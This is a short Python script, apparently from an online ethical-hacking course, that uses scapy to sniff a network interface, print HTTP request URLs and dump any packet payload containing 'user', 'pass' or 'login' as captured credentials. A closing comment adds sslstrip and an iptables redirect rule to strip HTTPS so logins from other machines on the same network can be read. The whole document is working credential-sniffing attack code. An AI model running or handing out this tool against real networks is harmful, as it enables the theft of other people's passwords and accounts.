# Packet Sniffer

#!/use/bin/env python
from scapy.layers import http
import scapy.all as scapy
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to sniff with.")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface to sniff with. Use --help for more info.")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["user", "pass", "login"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

options = get_arguments()
sniff(options.interface)

'''
pip install scapy_http    # Needed to import http
sslstrip    # Keep it running. This and one below commmands enable this program to work with HTTPS.
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables --flush    # After finishing this program, remove iptables.
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/9591426?start=0 (Capturing Passwords From Any Computer Connected to the Same Network)
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10253560?start=0 (Bypassing HTTPS & Sniffing Login Credentials)
'''